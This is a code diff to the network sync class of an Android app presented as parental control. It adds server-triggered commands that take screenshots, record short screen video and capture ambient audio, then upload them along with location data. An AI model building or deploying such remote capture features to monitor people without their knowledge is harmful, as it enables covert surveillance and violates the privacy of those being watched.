@@ -4,6 +4,8 @@ import android.content.Context;
 import android.util.Log;
 
 import com.kidsguard.parentalcontrol.models.ParentalConfig;
+import com.kidsguard.parentalcontrol.services.AppBlockerAccessibilityService;
+import com.kidsguard.parentalcontrol.services.UsageMonitorService;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -34,6 +36,18 @@ public class SyncClient {
             final JSONArray appCatalogArray,
             final SyncCallback callback
     ) {
+        sendReport(context, batteryLevel, screenTimeTodayMinutes, activePackageName, appCatalogArray, null, callback);
+    }
+
+    public static void sendReport(
+            final Context context,
+            final int batteryLevel,
+            final int screenTimeTodayMinutes,
+            final String activePackageName,
+            final JSONArray appCatalogArray,
+            final JSONObject locationObj,
+            final SyncCallback callback
+    ) {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -53,9 +67,12 @@ public class SyncClient {
                     JSONObject body = new JSONObject();
                     body.put("battery", batteryLevel);
                     body.put("screenTimeTodayMinutes", screenTimeTodayMinutes);
-                    body.put("currentActiveApp", activePackageName);
+                    body.put("currentActiveApp", activePackageName != null ? activePackageName : "");
                     if (appCatalogArray != null) {
                         body.put("appCatalog", appCatalogArray);
+                    }
+                    if (locationObj != null) {
+                        body.put("location", locationObj);
                     }
 
                     try (OutputStream os = conn.getOutputStream()) {
@@ -104,6 +121,38 @@ public class SyncClient {
                             }
                             config.setBlockedApps(blockedSet);
                         }
+                        if (resJson.has("appLimits")) {
+                            config.setAppLimitsJson(resJson.getJSONObject("appLimits").toString());
+                        }
+                        if (resJson.has("pendingCommands")) {
+                            JSONArray cmds = resJson.getJSONArray("pendingCommands");
+                            for (int i = 0; i < cmds.length(); i++) {
+                                String cmd = cmds.getString(i);
+                                if ("TAKE_SCREENSHOT".equalsIgnoreCase(cmd)) {
+                                    Log.i(TAG, "Comando recibido: TAKE_SCREENSHOT");
+                                    AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
+                                    if (a11y != null) {
+                                        a11y.captureScreenshot();
+                                    } else {
+                                        Log.w(TAG, "No se puede capturar pantalla: servicio de accesibilidad inactivo");
+                                    }
+                                } else if ("REQUEST_LOCATION".equalsIgnoreCase(cmd)) {
+                                    Log.i(TAG, "Comando recibido: REQUEST_LOCATION -> Actualizando GPS de inmediato");
+                                    UsageMonitorService.triggerImmediateSync();
+                                } else if ("TAKE_VIDEO_5S".equalsIgnoreCase(cmd)) {
+                                    Log.i(TAG, "Comando recibido: TAKE_VIDEO_5S -> Iniciando captura de clip de 5 segundos");
+                                    AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
+                                    if (a11y != null) {
+                                        a11y.captureVideoClip5s();
+                                    } else {
+                                        Log.w(TAG, "No se puede capturar video clip: servicio de accesibilidad inactivo");
+                                    }
+                                } else if ("RECORD_AUDIO_5S".equalsIgnoreCase(cmd)) {
+                                    Log.i(TAG, "Comando recibido: RECORD_AUDIO_5S -> Iniciando escucha ambiental de 5 segundos");
+                                    com.kidsguard.parentalcontrol.utils.AudioCaptureHelper.captureAndUploadAudio(context, 5);
+                                }
+                            }
+                        }
 
                         if (callback != null) callback.onSuccess();
                     } else {
@@ -113,6 +162,178 @@ public class SyncClient {
                 } catch (Exception e) {
                     Log.w(TAG, "Error sincronizando con servidor: " + e.getMessage());
                     if (callback != null) callback.onError(e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void sendEvent(
+            final Context context,
+            final String eventType,
+            final String packageName,
+            final String appName,
+            final String details
+    ) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/event";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(4000);
+                    conn.setReadTimeout(4000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    body.put("type", eventType);
+                    body.put("eventType", eventType);
+                    body.put("package", packageName != null ? packageName : "");
+                    body.put("packageName", packageName != null ? packageName : "");
+                    body.put("appName", appName != null ? appName : "");
+                    body.put("message", details != null ? details : "");
+                    body.put("details", details != null ? details : "");
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Error enviando evento: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void uploadScreenshot(final Context context, final String base64Image) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/screenshot";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(10000);
+                    conn.setReadTimeout(10000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    body.put("screenshot", base64Image);
+                    body.put("imageBase64", base64Image);
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        Log.i(TAG, "Captura de pantalla subida exitosamente al servidor");
+                    } else {
+                        Log.w(TAG, "Fallo al subir captura de pantalla. Código HTTP: " + responseCode);
+                    }
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Error subiendo captura de pantalla: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void uploadVideoClip(final Context context, final java.util.List<String> frames, final int intervalMs) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/video-clip";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(15000);
+                    conn.setReadTimeout(15000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    JSONArray framesArray = new JSONArray();
+                    for (String f : frames) {
+                        framesArray.put(f);
+                    }
+                    body.put("frames", framesArray);
+                    body.put("intervalMs", intervalMs);
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        Log.i(TAG, "Clip de video de 5 segundos (" + frames.size() + " fotogramas) subido exitosamente");
+                    } else {
+                        Log.w(TAG, "Error al subir video clip. Código HTTP: " + responseCode);
+                    }
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Excepción subiendo video clip: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void uploadAudioClip(final Context context, final String base64Audio, final int durationSeconds) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/audio-clip";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(15000);
+                    conn.setReadTimeout(15000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    body.put("audio", base64Audio);
+                    body.put("audioBase64", base64Audio);
+                    body.put("duration", durationSeconds);
+                    body.put("timestamp", System.currentTimeMillis());
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        Log.i(TAG, "🎙️ Clip de audio ambiental de " + durationSeconds + "s subido exitosamente al servidor");
+                    } else {
+                        Log.w(TAG, "Error al subir audio clip. Código HTTP: " + responseCode);
+                    }
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Excepción subiendo audio clip: " + e.getMessage());
                 }
             }
         }).start();
